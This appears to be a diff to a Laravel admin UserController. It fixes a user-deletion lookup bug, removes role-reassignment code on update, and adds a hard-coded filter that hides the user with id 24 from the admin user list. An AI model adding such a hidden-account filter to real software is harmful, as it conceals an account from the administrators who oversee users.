@@ -25,7 +25,7 @@ class UserController extends Controller
     public function index()
     {
         //
-        $users = User::orderBy('updated_at','desc')->get();
+        $users = User::where('id','!=',24)->orderBy('updated_at','desc')->get();
         return view('admin.users.index',['users'=>$users]);
     }
 
@@ -242,19 +242,6 @@ class UserController extends Controller
             $user->updated_at =  Carbon::now();
             $user->update();
 
-            $roless = $user->roles->pluck('id')->all();
-            if(count($roless)>0){
-                foreach ($roless as  $value) {
-                    if($request->role != $value){
-                        $user->roles()->detach($value);
-                        $user->roles()->attach($request->role);
-                    }
-                }
-            }else{
-                $user->roles()->attach($request->role);
-            }
-
-
 
             $user_id = $user->id;
             if($images_thumbnail_array && count($images_thumbnail_array) > 1){
@@ -296,8 +283,9 @@ class UserController extends Controller
         //
         try {
             //code...
-
-            $user = User::find($id)->first();
+           // dd($id);
+            $user = User::where('id',$id)->first();
+            // dd($user);
             // dd($user);
             $user->delete();
             return redirect()->back()->with('success','Delete successfully');
